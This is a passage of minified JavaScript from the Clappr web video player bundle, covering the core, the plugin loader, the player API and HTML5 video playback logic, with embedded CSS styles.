this.plugins.filter((function(e){return e.name===t}))[0]}},{key:"load",value:function e(t,r){this.options.mimeType=r,t=t&&t.constructor===Array?t:[t],this.options.sources=t,this.containers.forEach((function(e){return e.destroy()})),this.containerFactory.options=y.extend(!0,this.options,{sources:t}),this.prepareContainers()}},{key:"destroy",value:function e(){this.disableResizeObserver(),this.containers.forEach((function(e){return e.destroy()})),this.plugins.forEach((function(e){return e.destroy()})),this.$el.remove(),y(document).unbind("fullscreenchange",this._boundFullscreenHandler),y(document).unbind("MSFullscreenChange",this._boundFullscreenHandler),y(document).unbind("mozfullscreenchange",this._boundFullscreenHandler),this.stopListening()}},{key:"handleFullscreenChange",value:function e(){this.trigger(k.CORE_FULLSCREEN,this.isFullscreen()),this.updateSize()}},{key:"handleWindowResize",value:function e(t){var r=window.innerWidth>window.innerHeight?"landscape":"portrait";this._screenOrientation!==r&&(this._screenOrientation=r,this.triggerResize({width:this.el.clientWidth,height:this.el.clientHeight}),this.trigger(k.CORE_SCREEN_ORIENTATION_CHANGED,{event:t,orientation:this._screenOrientation}))}},{key:"removeContainer",value:function e(t){this.stopListening(t),this.containers=this.containers.filter((function(e){return e!==t}))}},{key:"setupContainer",value:function e(t){this.listenTo(t,k.CONTAINER_DESTROYED,this.removeContainer),this.containers.push(t)}},{key:"setupContainers",value:function e(t){return t.forEach(this.setupContainer.bind(this)),this.trigger(k.CORE_CONTAINERS_CREATED),this.renderContainers(),this.activeContainer=t[0],this.render(),this.appendToParent(),this.containers}},{key:"renderContainers",value:function e(){var t=this;this.containers.forEach((function(e){return t.el.appendChild(e.render().el)}))}},{key:"createContainer",value:function e(t,r){var n=this.containerFactory.createContainer(t,r);return this.setupContainer(n),this.el.appendChild(n.render().el),n}},{key:"getCurrentContainer",value:function e(){return this.activeContainer}},{key:"getCurrentPlayback",value:function e(){return this.activePlayback}},{key:"getPlaybackType",value:function e(){return this.activeContainer&&this.activeContainer.getPlaybackType()}},{key:"isFullscreen",value:function e(){var t=Ft.fullscreenElement();if(!t)return!1;var r=this.activePlayback&&this.activePlayback.el;return t===this.el||t===r}},{key:"toggleFullscreen",value:function e(){var t=this;if(this.isFullscreen())Ft.cancelFullscreen(),!E.isiOS&&this.$el.removeClass("fullscreen nocursor");else{var r=E.isiOS?this.activePlayback&&this.activePlayback.el:this.el;if(!r)return;E.isSafari||E.isiOS?Ft.requestFullscreen(r):Ft.requestFullscreen(r).then((function(e){return e}),(function(e){return setTimeout((function(){if(!t.isFullscreen())throw new ReferenceError(e)}),600)})),!E.isiOS&&this.$el.addClass("fullscreen")}}},{key:"onMouseMove",value:function e(t){this.trigger(k.CORE_MOUSE_MOVE,t)}},{key:"onMouseLeave",value:function e(t){this.trigger(k.CORE_MOUSE_LEAVE,t)}},{key:"configure",value:function e(t){var r=this;this._options=y.extend(!0,this._options,t),this.configureDomRecycler();var n=t.source||t.sources;n&&this.load(n,t.mimeType||this.options.mimeType),this.trigger(k.CORE_OPTIONS_CHANGE,t),this.containers.forEach((function(e){return e.configure(r.options)}))}},{key:"appendToParent",value:function e(){var t=kr.getStyleFor('[data-player] {\n  -webkit-touch-callout: none;\n  -webkit-user-select: none;\n  -moz-user-select: none;\n  -ms-user-select: none;\n  -o-user-select: none;\n  user-select: none;\n  -webkit-font-smoothing: antialiased;\n  -moz-osx-font-smoothing: grayscale;\n  transform: translate3d(0, 0, 0);\n  position: relative;\n  margin: 0;\n  padding: 0;\n  border: 0;\n  font-style: normal;\n  font-weight: normal;\n  text-align: center;\n  overflow: hidden;\n  font-size: 100%;\n  font-family: "Roboto", "Open Sans", Arial, sans-serif;\n  text-shadow: 0 0 0;\n  box-sizing: border-box; }\n  [data-player]:focus {\n    outline: 0; }\n  [data-player] * {\n    box-sizing: inherit; }\n  [data-player] > * {\n    float: none;\n    max-width: none; }\n  [data-player] > div {\n    display: block; }\n  [data-player].fullscreen {\n    width: 100% !important;\n    height: 100% !important;\n    top: 0;\n    left: 0; }\n  [data-player].nocursor {\n    cursor: none; }\n\n.clappr-style {\n  display: none !important; }\n'.toString(),{baseUrl:this.options.baseUrl}),r=kr.getStyleFor('[data-player] div, [data-player] span, [data-player] applet, [data-player] object, [data-player] iframe,\n[data-player] h1, [data-player] h2, [data-player] h3, [data-player] h4, [data-player] h5, [data-player] h6, [data-player] p, [data-player] blockquote, [data-player] pre,\n[data-player] a, [data-player] abbr, [data-player] acronym, [data-player] address, [data-player] big, [data-player] cite, [data-player] code,\n[data-player] del, [data-player] dfn, [data-player] em, [data-player] img, [data-player] ins, [data-player] kbd, [data-player] q, [data-player] s, [data-player] samp,\n[data-player] small, [data-player] strike, [data-player] strong, [data-player] sub, [data-player] sup, [data-player] tt, [data-player] var,\n[data-player] b, [data-player] u, [data-player] i, [data-player] center,\n[data-player] dl, [data-player] dt, [data-player] dd, [data-player] ol, [data-player] ul, [data-player] li,\n[data-player] fieldset, [data-player] form, [data-player] label, [data-player] legend,\n[data-player] table, [data-player] caption, [data-player] tbody, [data-player] tfoot, [data-player] thead, [data-player] tr, [data-player] th, [data-player] td,\n[data-player] article, [data-player] aside, [data-player] canvas, [data-player] details, [data-player] embed,\n[data-player] figure, [data-player] figcaption, [data-player] footer, [data-player] header, [data-player] hgroup,\n[data-player] menu, [data-player] nav, [data-player] output, [data-player] ruby, [data-player] section, [data-player] summary,\n[data-player] time, [data-player] mark, [data-player] audio, [data-player] video {\n  margin: 0;\n  padding: 0;\n  border: 0;\n  font: inherit;\n  font-size: 100%;\n  vertical-align: baseline; }\n\n[data-player] table {\n  border-collapse: collapse;\n  border-spacing: 0; }\n\n[data-player] caption, [data-player] th, [data-player] td {\n  text-align: left;\n  font-weight: normal;\n  vertical-align: middle; }\n\n[data-player] q, [data-player] blockquote {\n  quotes: none; }\n  [data-player] q:before, [data-player] q:after, [data-player] blockquote:before, [data-player] blockquote:after {\n    content: "";\n    content: none; }\n\n[data-player] a img {\n  border: none; }\n'.toString(),{baseUrl:this.options.baseUrl});this.$el.append(t[0]),this.options.includeResetStyle&&this.$el.append(r[0]),!(this.$el.parent()&&this.$el.parent().length)&&this.$el.appendTo(this.options.parentElement)}},{key:"render",value:function e(){this.options.width=this.options.width||this.$el.width(),this.options.height=this.options.height||this.$el.height();var t={width:this.options.width,height:this.options.height};return this.previousSize=this.currentSize=this.computedSize=t,this.updateSize(),this.enableResizeObserver(),this}}]),n}(Tr),Ir=(Object.assign(Lr.prototype,n),function(e){d(n,e);var r=f(n);function n(e){var t;return u(this,n),(t=r.call(this,e.options)).player=e,t}return c(n,[{key:"loader",get:function e(){return this.player.loader}}]),c(n,[{key:"create",value:function e(){return this.options.loader=this.loader,this.core=new Lr(this.options),this.addCorePlugins(),this.core.createContainers(this.options),this.core}},{key:"addCorePlugins",value:function e(){var r=this;return this.loader.corePlugins.forEach((function(e){var t=new e(r.core);r.core.addPlugin(t),r.setupExternalInterface(t)})),this.core}},{key:"setupExternalInterface",value:function e(t){var r=t.getExternalInterface();for(var n in r)this.player[n]=r[n].bind(t)}}]),n}(r)),Dr=/(\d+)(?:\.(\d+))?(?:\.(\d+))?/,Pr=function(){function o(e,t,r){u(this,o),this.major=parseInt(e||0,10),this.minor=parseInt(t||0,10),this.patch=parseInt(r||0,10)}return c(o,null,[{key:"parse",value:function e(){var n=X((arguments.length>0&&void 0!==arguments[0]?arguments[0]:"").match(Dr)||[],4),i=n[1],a=n[2],s=n[3];return void 0===i?null:new o(i,a,s)}}]),c(o,[{key:"compare",value:function e(t){var r=this.major-t.major;return r=(r=r||this.minor-t.minor)||this.patch-t.patch}},{key:"inc",value:function e(){var t=arguments.length>0&&void 0!==arguments[0]?arguments[0]:"patch";return void 0!==this[t]&&(this[t]+=1),this}},{key:"satisfies",value:function e(t,r){return this.compare(t)>=0&&(!r||this.compare(r)<0)}},{key:"toString",value:function e(){return"".concat(this.major,".").concat(this.minor,".").concat(this.patch)}}]),o}(),Nr=function e(t,n){return t&&n?Object.entries(t).filter((function(e){return X(e,2)[1].type===n})).reduce((function(e,t){var r=X(t,2),n=r[0],i=r[1];return e[n]=i,e}),{}):{}},o=function(){var a={plugins:{},playbacks:[]},l="0.4.19";return function(){function o(){var e=arguments.length>0&&void 0!==arguments[0]?arguments[0]:[],t=arguments.length>1&&void 0!==arguments[1]?arguments[1]:0;u(this,o),this.playerId=t,this.playbackPlugins=Z(a.playbacks);var r=o.registeredPlugins,n=r.core,i=r.container;this.containerPlugins=Object.values(i),this.corePlugins=Object.values(n),Array.isArray(e)||this.validateExternalPluginsType(e),this.addExternalPlugins(e)}return c(o,null,[{key:"checkVersionSupport",value:function e(t){var r=t.prototype,n=r.supportedVersion,i=r.name;if(!n||!n.min)return b.warn("Loader","missing version information for ".concat(i)),!1;var a=n.max?Pr.parse(n.max):Pr.parse(n.min).inc("minor"),s=Pr.parse(n.min);return!!Pr.parse(l).satisfies(s,a)||(b.warn("Loader","unsupported plugin ".concat(i,": Clappr version ").concat(l," does not match required range [").concat(s,",").concat(a,")")),!1)}},{key:"registerPlugin",value:function e(t){if(!t||!t.prototype.name)return b.warn("Loader","missing information to register plugin: ".concat(t)),!1;o.checkVersionSupport(t);var r=a.plugins;if(!r)return!1;var n=r[t.prototype.name];return n&&b.warn("Loader","overriding plugin entry: ".concat(t.prototype.name," - ").concat(n)),r[t.prototype.name]=t,!0}},{key:"registerPlayback",value:function e(t){if(!t||!t.prototype.name)return!1;o.checkVersionSupport(t);var r=a.playbacks,n=r.findIndex((function(e){return e.prototype.name===t.prototype.name}));if(n>=0){var i=r[n];r.splice(n,1),b.warn("Loader","overriding playback entry: ".concat(i.name," - ").concat(i))}return a.playbacks=[t].concat(Z(r)),!0}},{key:"unregisterPlugin",value:function e(t){if(!t)return!1;var r=a.plugins;return!!r[t]&&(delete r[t],!0)}},{key:"unregisterPlayback",value:function e(t){if(!t)return!1;var r=a.playbacks,n=r.findIndex((function(e){return e.prototype.name===t}));return!(n<0)&&(r.splice(n,1),a.playbacks=r,!0)}},{key:"clearPlugins",value:function e(){a.plugins={}}},{key:"clearPlaybacks",value:function e(){a.playbacks=[]}},{key:"registeredPlaybacks",get:function e(){return Z(a.playbacks)}},{key:"registeredPlugins",get:function e(){var t=a.plugins;return{core:Nr(t,"core"),container:Nr(t,"container")}}}]),c(o,[{key:"groupPluginsByType",value:function e(t){return Array.isArray(t)&&(t=t.reduce((function(e,t){return e[t.type]||(e[t.type]=[]),e[t.type].push(t),e}),{})),t}},{key:"removeDups",value:function e(t){var n=arguments.length>1&&void 0!==arguments[1]&&arguments[1],i=t.reduceRight((function e(t,r){return t[r.prototype.name]&&n||(t[r.prototype.name]&&delete t[r.prototype.name],t[r.prototype.name]=r),t}),Object.create(null)),a=[];for(var s in i)a.unshift(i[s]);return a}},{key:"addExternalPlugins",value:function e(t){var r="boolean"!=typeof t.loadExternalPluginsFirst||t.loadExternalPluginsFirst,n="boolean"!=typeof t.loadExternalPlaybacksFirst||t.loadExternalPlaybacksFirst;if((t=this.groupPluginsByType(t)).playback){var i=t.playback.filter((function(e){return o.checkVersionSupport(e),!0}));this.playbackPlugins=n?this.removeDups(i.concat(this.playbackPlugins)):this.removeDups(this.playbackPlugins.concat(i),!0)}if(t.container){var a=t.container.filter((function(e){return o.checkVersionSupport(e),!0}));this.containerPlugins=r?this.removeDups(a.concat(this.containerPlugins)):this.removeDups(this.containerPlugins.concat(a),!0)}if(t.core){var s=t.core.filter((function(e){return o.checkVersionSupport(e),!0}));this.corePlugins=r?this.removeDups(s.concat(this.corePlugins)):this.removeDups(this.corePlugins.concat(s),!0)}}},{key:"validateExternalPluginsType",value:function e(t){["playback","container","core"].forEach((function(r){(t[r]||[]).forEach((function(e){var t="external "+e.type+" plugin on "+r+" array";if(e.type!==r)throw new ReferenceError(t)}))}))}}]),o}()}(),xr=Kt().replace(/\/[^/]+$/,""),Mr=function(e){d(a,e);var i=f(a);function a(e){var t;u(this,a),t=i.call(this,e);var n={playerId:Vt(""),persistConfig:!0,width:640,height:360,baseUrl:xr,allowUserInteraction:E.isMobile,includeResetStyle:!0,playback:{recycleVideo:!0}};return t._options=y.extend(!0,n,e),t.options.sources=t._normalizeSources(e),t.options.chromeless||(t.options.allowUserInteraction=!0),t.options.allowUserInteraction||(t.options.disableKeyboardShortcuts=!0),t._registerOptionEventListeners(t.options.events),t._coreFactory=new Ir(z(t)),t.options.parentId?t.setParentId(t.options.parentId):t.options.parent&&t.attachTo(t.options.parent),t}return c(a,[{key:"loader",set:function e(t){this._loader=t},get:function e(){return this._loader||(this._loader=new o(this.options.plugins||{},this.options.playerId)),this._loader}},{key:"ended",get:function e(){return this.core.activeContainer.ended}},{key:"buffering",get:function e(){return this.core.activeContainer.buffering}},{key:"isReady",get:function e(){return!!this._ready}},{key:"eventsMapping",get:function e(){return{onReady:k.PLAYER_READY,onResize:k.PLAYER_RESIZE,onPlay:k.PLAYER_PLAY,onPause:k.PLAYER_PAUSE,onStop:k.PLAYER_STOP,onEnded:k.PLAYER_ENDED,onSeek:k.PLAYER_SEEK,onError:k.PLAYER_ERROR,onTimeUpdate:k.PLAYER_TIMEUPDATE,onVolumeUpdate:k.PLAYER_VOLUMEUPDATE,onSubtitleAvailable:k.PLAYER_SUBTITLE_AVAILABLE}}}]),c(a,[{key:"setParentId",value:function e(t){var r=document.querySelector(t);return r&&this.attachTo(r),this}},{key:"attachTo",value:function e(t){return this.options.parentElement=t,this.core=this._coreFactory.create(),this._addEventListeners(),this}},{key:"_addEventListeners",value:function e(){return this.core.isReady?this._onReady():this.listenToOnce(this.core,k.CORE_READY,this._onReady),this.listenTo(this.core,k.CORE_ACTIVE_CONTAINER_CHANGED,this._containerChanged),this.listenTo(this.core,k.CORE_FULLSCREEN,this._onFullscreenChange),this.listenTo(this.core,k.CORE_RESIZE,this._onResize),this}},{key:"_addContainerEventListeners",value:function e(){var t=this.core.activeContainer;return t&&(this.listenTo(t,k.CONTAINER_PLAY,this._onPlay),this.listenTo(t,k.CONTAINER_PAUSE,this._onPause),this.listenTo(t,k.CONTAINER_STOP,this._onStop),this.listenTo(t,k.CONTAINER_ENDED,this._onEnded),this.listenTo(t,k.CONTAINER_SEEK,this._onSeek),this.listenTo(t,k.CONTAINER_ERROR,this._onError),this.listenTo(t,k.CONTAINER_TIMEUPDATE,this._onTimeUpdate),this.listenTo(t,k.CONTAINER_VOLUME,this._onVolumeUpdate),this.listenTo(t,k.CONTAINER_SUBTITLE_AVAILABLE,this._onSubtitleAvailable)),this}},{key:"_registerOptionEventListeners",value:function e(){var n=this,i=arguments.length>0&&void 0!==arguments[0]?arguments[0]:{},r=arguments.length>1&&void 0!==arguments[1]?arguments[1]:{};return Object.keys(i).length>0&&Object.keys(r).forEach((function(e){var t=n.eventsMapping[e];t&&n.off(t,r[e])})),Object.keys(i).forEach((function(e){var t=n.eventsMapping[e];if(t){var r=i[e];(r="function"==typeof r&&r)&&n.on(t,r)}})),this}},{key:"_containerChanged",value:function e(){this.stopListening(),this._addEventListeners()}},{key:"_onReady",value:function e(){this._ready=!0,this._addContainerEventListeners(),this.trigger(k.PLAYER_READY)}},{key:"_onFullscreenChange",value:function e(t){this.trigger(k.PLAYER_FULLSCREEN,t)}},{key:"_onVolumeUpdate",value:function e(t){this.trigger(k.PLAYER_VOLUMEUPDATE,t)}},{key:"_onSubtitleAvailable",value:function e(){this.trigger(k.PLAYER_SUBTITLE_AVAILABLE)}},{key:"_onResize",value:function e(t){this.trigger(k.PLAYER_RESIZE,t)}},{key:"_onPlay",value:function e(){this.trigger(k.PLAYER_PLAY)}},{key:"_onPause",value:function e(){this.trigger(k.PLAYER_PAUSE)}},{key:"_onStop",value:function e(){this.trigger(k.PLAYER_STOP,this.getCurrentTime())}},{key:"_onEnded",value:function e(){this.trigger(k.PLAYER_ENDED)}},{key:"_onSeek",value:function e(t){this.trigger(k.PLAYER_SEEK,t)}},{key:"_onTimeUpdate",value:function e(t){this.trigger(k.PLAYER_TIMEUPDATE,t)}},{key:"_onError",value:function e(t){this.trigger(k.PLAYER_ERROR,t)}},{key:"_normalizeSources",value:function e(t){var r=t.sources||(void 0!==t.source?[t.source]:[]);return 0===r.length?[{source:"",mimeType:""}]:r}},{key:"resize",value:function e(t){return this.core.resize(t),this}},{key:"load",value:function e(t,r,n){return void 0!==n&&this.configure({autoPlay:!!n}),this.core.load(t,r),this}},{key:"destroy",value:function e(){return this.stopListening(),this.core.destroy(),this}},{key:"consent",value:function e(t){this.core.getCurrentPlayback().consent(t)}},{key:"play",value:function e(){return this.core.activeContainer.play(),this}},{key:"pause",value:function e(){return this.core.activeContainer.pause(),this}},{key:"stop",value:function e(){return this.core.activeContainer.stop(),this}},{key:"seek",value:function e(t){return this.core.activeContainer.seek(t),this}},{key:"seekPercentage",value:function e(t){return this.core.activeContainer.seekPercentage(t),this}},{key:"mute",value:function e(){return this.core.activePlayback.mute(),this}},{key:"unmute",value:function e(){return this.core.activePlayback.unmute(),this}},{key:"isPlaying",value:function e(){return this.core.activeContainer.isPlaying()}},{key:"isDvrEnabled",value:function e(){return this.core.activeContainer.isDvrEnabled()}},{key:"isDvrInUse",value:function e(){return this.core.activeContainer.isDvrInUse()}},{key:"configure",value:function e(){var t=arguments.length>0&&void 0!==arguments[0]?arguments[0]:{};return this._registerOptionEventListeners(t.events,this.options.events),this.core.configure(t),this}},{key:"getPlugin",value:function e(t){return this.core.plugins.concat(this.core.activeContainer.plugins).filter((function(e){return e.name===t}))[0]}},{key:"getCurrentTime",value:function e(){return this.core.activeContainer.getCurrentTime()}},{key:"getStartTimeOffset",value:function e(){return this.core.activeContainer.getStartTimeOffset()}},{key:"getDuration",value:function e(){return this.core.activeContainer.getDuration()}}]),a}(r),a=(Object.assign(Mr.prototype,n),function(e){d(n,e);var r=f(n);function n(e){var t;return u(this,n),(t=r.call(this,e.options)).container=e,t.enabled=!0,t.bindEvents(),t}return c(n,[{key:"playerError",get:function e(){return this.container.playerError}}]),c(n,[{key:"enable",value:function e(){this.enabled||(this.bindEvents(),this.enabled=!0)}},{key:"disable",value:function e(){this.enabled&&(this.stopListening(),this.enabled=!1)}},{key:"bindEvents",value:function e(){}},{key:"destroy",value:function e(){this.stopListening()}}]),n}(r)),l=(Object.assign(a.prototype,n),a.extend=function(e){return xt(a,e)},a.type="container",function(e){d(n,e);var r=f(n);function n(e){var t;return u(this,n),(t=r.call(this,e.options)).core=e,t.enabled=!0,t.bindEvents(),t}return c(n,[{key:"playerError",get:function e(){return this.core.playerError}}]),c(n,[{key:"bindEvents",value:function e(){}},{key:"enable",value:function e(){this.enabled||(this.bindEvents(),this.enabled=!0)}},{key:"disable",value:function e(){this.enabled&&(this.stopListening(),this.enabled=!1)}},{key:"getExternalInterface",value:function e(){return{}}},{key:"destroy",value:function e(){this.stopListening()}}]),n}(r)),C=(Object.assign(l.prototype,n),l.extend=function(e){return xt(l,e)},l.type="core",function(e){d(n,e);var r=f(n);function n(e){var t;return u(this,n),(t=r.call(this,e.options)).container=e,t.enabled=!0,t.bindEvents(),t}return c(n,[{key:"playerError",get:function e(){return this.container.playerError}}]),c(n,[{key:"enable",value:function e(){this.enabled||(this.bindEvents(),this.$el.show(),this.enabled=!0)}},{key:"disable",value:function e(){this.stopListening(),this.$el.hide(),this.enabled=!1}},{key:"bindEvents",value:function e(){}}]),n}(Tr)),Fr=(Object.assign(C.prototype,n),C.extend=function(e){return xt(C,e)},C.type="container",'<% for (var i = 0; i < tracks.length; i++) { %>\n  <track data-html5-video-track="<%= i %>" kind="<%= tracks[i].kind %>" label="<%= tracks[i].label %>" srclang="<%= tracks[i].lang %>" src="<%= tracks[i].src %>">\n<% }; %>\n'),Ur={mp4:["avc1.42E01E","avc1.58A01E","avc1.4D401E","avc1.64001E","mp4v.20.8","mp4v.20.240","mp4a.40.2"].map((function(e){return'video/mp4; codecs="'+e+', mp4a.40.2"'})),ogg:['video/ogg; codecs="theora, vorbis"','video/ogg; codecs="dirac"','video/ogg; codecs="theora, speex"'],"3gpp":['video/3gpp; codecs="mp4v.20.8, samr"'],webm:['video/webm; codecs="vp8, vorbis"'],mkv:['video/x-matroska; codecs="theora, vorbis"'],m3u8:["application/x-mpegurl"]},jr=(Ur.ogv=Ur.ogg,Ur["3gp"]=Ur["3gpp"],{wav:["audio/wav"],mp3:["audio/mp3",'audio/mpeg;codecs="mp3"'],aac:['audio/mp4;codecs="mp4a.40.5"'],oga:["audio/ogg"]}),Vr=Object.keys(jr).reduce((function(e,t){return[].concat(Z(e),Z(jr[t]))}),[]),Gr={code:"unknown",message:"unknown"},R=function(e){d(l,e);var o=f(l);function l(){var e;u(this,l);for(var t=arguments.length,r=new Array(t),n=0;n<t;n++)r[n]=arguments[n];(e=o.call.apply(o,[this].concat(r)))._destroyed=!1,e._loadStarted=!1,e._isBuffering=!1,e._playheadMoving=!1,e._playheadMovingTimer=null,e._stopped=!1,e._ccTrackId=-1,e._setupSrc(e.options.src),e.options.playback||(e.options.playback=e.options||{}),e.options.playback.disableContextMenu=e.options.playback.disableContextMenu||e.options.disableVideoTagContextMenu,e._minDvrSize=e.isValidMinimumDVRSizeConfig?e.minimumDVRSizeConfig:60;var s,i=e.options.playback,a=i.preload||(E.isSafari?"auto":e.options.preload);return e.options.poster&&("string"==typeof e.options.poster?s=e.options.poster:"string"==typeof e.options.poster.url&&(s=e.options.poster.url)),y.extend(!0,e.el,{muted:e.options.mute,defaultMuted:e.options.mute,loop:e.options.loop,poster:s,preload:a||"metadata",crossOrigin:i.crossOrigin,"x-webkit-playsinline":i.playInline}),(i.controls||e.options.useVideoTagDefaultControls)&&e.$el.attr("controls",""),i.playInline&&e.$el.attr({playsinline:"playsinline"}),i.crossOrigin&&e.$el.attr({crossorigin:i.crossOrigin}),e.settings={default:["seekbar"]},e.settings.left=["playpause","position","duration"],e.settings.right=["fullscreen","volume","hd-indicator"],i.externalTracks&&e._setupExternalTracks(i.externalTracks),e.options.autoPlay&&e.attemptAutoPlay(),e}return c(l,[{key:"name",get:function e(){return"html5_video"}},{key:"supportedVersion",get:function e(){return{min:"0.4.19"}}},{key:"tagName",get:function e(){return this.isAudioOnly?"audio":"video"}},{key:"isAudioOnly",get:function e(){var t=this.options.src,r=l._mimeTypesForUrl(t,jr,this.options.mimeType);return this.options.playback&&this.options.playback.audioOnly||this.options.audioOnly||Vr.indexOf(r[0])>=0}},{key:"attributes",get:function e(){return{"data-html5-video":""}}},{key:"events",get:function e(){return{canplay:"_onCanPlay",canplaythrough:"_handleBufferingEvents",durationchange:"_onDurationChange",ended:"_onEnded",error:"_onError",loadeddata:"_onLoadedData",loadedmetadata:"_onLoadedMetadata",pause:"_onPause",playing:"_onPlaying",progress:"_onProgress",seeking:"_onSeeking",seeked:"_onSeeked",stalled:"_handleBufferingEvents",timeupdate:"_onTimeUpdate",waiting:"_onWaiting"}}},{key:"ended",get:function e(){return this.el.ended}},{key:"buffering",get:function e(){return this._isBuffering}},{key:"isLive",get:function e(){return this.getPlaybackType()===S.LIVE}},{key:"dvrEnabled",get:function e(){return this.getDuration()>=this._minDvrSize&&this.isLive}},{key:"minimumDVRSizeConfig",get:function e(){return this.options.playback&&this.options.playback.minimumDvrSize}},{key:"isValidMinimumDVRSizeConfig",get:function e(){return void 0!==this.minimumDVRSizeConfig&&"number"==typeof this.minimumDVRSizeConfig}}]),c(l,[{key:"configure",value:function e(t){q(s(l.prototype),"configure",this).call(this,t),this.el.loop=!!t.loop}},{key:"attemptAutoPlay",value:function e(){var r=this;this.canAutoPlay((function(e,t){t&&b.warn(r.name,"autoplay error.",{result:e,error:t}),e&&setTimeout((function(){return!r._destroyed&&r.play()}),0)}))}},{key:"canAutoPlay",value:function e(t){if(this.options.disableCanAutoPlay)t(!0,null);else{var r={timeout:this.options.autoPlayTimeout||500,inline:this.options.playback.playInline||!1,muted:this.options.mute||!1};E.isMobile&&qt.options.recycleVideo&&(r.element=this.el),Wt(t,r)}}},{key:"_setupExternalTracks",value:function e(t){this._externalTracks=t.map((function(e){return{kind:e.kind||"subtitles",label:e.label,lang:e.lang,src:e.src}}))}},{key:"_setupSrc",value:function e(t){this.el.src!==t&&(this._ccIsSetup=!1,this.el.src=t,this._src=this.el.src)}},{key:"_onLoadedMetadata",value:function e(t){this._handleBufferingEvents(),this.trigger(k.PLAYBACK_LOADEDMETADATA,{duration:t.target.duration,data:t}),this._updateSettings();var r=void 0===this._options.autoSeekFromUrl||this._options.autoSeekFromUrl;this.getPlaybackType()!==S.LIVE&&r&&this._checkInitialSeek()}},{key:"_onDurationChange",value:function e(){this._updateSettings(),this._onTimeUpdate(),this._onProgress()}},{key:"_updateSettings",value:function e(){this.getPlaybackType()===S.VOD||this.getPlaybackType()===S.AOD?this.settings.left=["playpause","position","duration"]:this.settings.left=["playstop"],this.settings.seekEnabled=this.isSeekEnabled(),this.trigger(k.PLAYBACK_SETTINGSUPDATE)}},{key:"isSeekEnabled",value:function e(){return isFinite(this.getDuration())}},{key:"getPlaybackType",value:function e(){var t="audio"===this.tagName?S.AOD:S.VOD;return[0,void 0,1/0].indexOf(this.el.duration)>=0?S.LIVE:t}},{key:"isHighDefinitionInUse",value:function e(){return!1}},{key:"consent",value:function e(t){var r=this;if(this.isPlaying()||this.el._consented)q(s(l.prototype),"consent",this).call(this,t);else{var n=function e(){r.el.removeEventListener("loadedmetadata",e,!1),r.el.removeEventListener("error",e,!1),r.el._consented=!0,q(s(l.prototype),"consent",r).call(r,t)};this.el.addEventListener("loadedmetadata",n,!1),this.el.addEventListener("error",n,!1),this.el.load()}}},{key:"play",value:function e(){this.trigger(k.PLAYBACK_PLAY_INTENT),this._stopped=!1,this._setupSrc(this._src),this._handleBufferingEvents();var t=this.el.play();t&&t.catch&&t.catch((function(){}))}},{key:"pause",value:function e(){this.el.pause(),this.dvrEnabled&&this._updateDvr(!0)}},{key:"stop",value:function e(){this.pause(),this._stopped=!0,this.el.removeAttribute("src"),this.el.load(),this._stopPlayheadMovingChecks(),this._handleBufferingEvents(),this.trigger(k.PLAYBACK_STOP)}},{key:"volume",value:function e(t){0===t?(this.$el.attr({muted:"true"}),this.el.muted=!0):(this.$el.attr({muted:null}),this.el.muted=!1,this.el.volume=t/100)}},{key:"mute",value:function e(){this.el.muted=!0}},{key:"unmute",value:function e(){this.el.muted=!1}},{key:"isMuted",value:function e(){return!0===this.el.muted||0===this.el.volume}},{key:"isPlaying",value:function e(){return!this.el.paused&&!this.el.ended}},{key:"_startPlayheadMovingChecks",value:function e(){null===this._playheadMovingTimer&&(this._playheadMovingTimeOnCheck=null,this._determineIfPlayheadMoving(),this._playheadMovingTimer=setInterval(this._determineIfPlayheadMoving.bind(this),500))}},{key:"_stopPlayheadMovingChecks",value:function e(){null!==this._playheadMovingTimer&&(clearInterval(this._playheadMovingTimer),this._playheadMovingTimer=null,this._playheadMoving=!1)}},{key:"_determineIfPlayheadMoving",value:function e(){var t=this._playheadMovingTimeOnCheck,r=this.el.currentTime;this._playheadMoving=t!==r,this._playheadMovingTimeOnCheck=r,this._handleBufferingEvents()}},{key:"_onWaiting",value:function e(){this._loadStarted=!0,this._handleBufferingEvents()}},{key:"_onLoadedData",value:function e(){this._loadStarted=!0,this._handleBufferingEvents()}},{key:"_onCanPlay",value:function e(){this._handleBufferingEvents()}},{key:"_onPlaying",value:function e(){this._checkForClosedCaptions(),this._startPlayheadMovingChecks(),this._handleBufferingEvents(),this.trigger(k.PLAYBACK_PLAY)}},{key:"_onPause",value:function e(){this._stopPlayheadMovingChecks(),this._handleBufferingEvents(),this.trigger(k.PLAYBACK_PAUSE)}},{key:"_onSeeking",value:function e(){this.trigger(k.PLAYBACK_SEEK,this.getCurrentTime()),this._handleBufferingEvents()}},{key:"_onSeeked",value:function e(){this._handleBufferingEvents(),this.trigger(k.PLAYBACK_SEEKED)}},{key:"_onEnded",value:function e(){this._handleBufferingEvents(),this.trigger(k.PLAYBACK_ENDED,this.name)}},{key:"_handleBufferingEvents",value:function e(){var t=!this.el.ended&&!this.el.paused,r=this._loadStarted&&!this.el.ended&&!this._stopped&&(t&&!this._playheadMoving||this.el.readyState<this.el.HAVE_FUTURE_DATA);this._isBuffering!==r&&(this._isBuffering=r,r?this.trigger(k.PLAYBACK_BUFFERING,this.name):this.trigger(k.PLAYBACK_BUFFERFULL,this.name))}},{key:"_onError",value:function e(){var t=this.el.error||Gr,r=t.code,n=t.message,i=r===Gr.code,a=this.createError({code:r,description:n,raw:this.el.error,level:i?T.Levels.WARN:T.Levels.FATAL});i?b.warn(this.name,"HTML5 unknown error: ",a):this.trigger(k.PLAYBACK_ERROR,a)}},{key:"destroy",value:function e(){this._destroyed=!0,this.handleTextTrackChange&&this.el.textTracks.removeEventListener("change",this.handleTextTrackChange),q(s(l.prototype),"destroy",this).call(this),this.el.removeAttribute("src"),this.el.load(),this._src=null,qt.garbage(this.el)}},{key:"_updateDvr",value:function e(t){this.trigger(k.PLAYBACK_DVR,t),this.trigger(k.PLAYBACK_STATS_ADD,{dvr:t})}},{key:"seek",value:function e(t){t<0&&(b.warn("Attempt to seek to a negative time. Resetting to live point. Use seekToLivePoint() to seek to the live point."),t=this.getDuration()),this.dvrEnabled&&this._updateDvr(t<this.getDuration()-3),t+=this.el.seekable.start(0),this.el.currentTime=t}},{key:"seekPercentage",value:function e(t){var r=this.el.duration*(t/100);this.seek(r)}},{key:"_checkInitialSeek",value:function e(){var t=jt();0!==t&&this.seek(t)}},{key:"getCurrentTime",value:function e(){return this.el.currentTime}},{key:"getDuration",value:function e(){if(this.isLive){if(this.el.seekable.length>0)return this.el.seekable.end(0)-this.el.seekable.start(0);this._scheduleUpdateSettingsCheck()}return this.el.duration}},{key:"_scheduleUpdateSettingsCheck",value:function e(){var 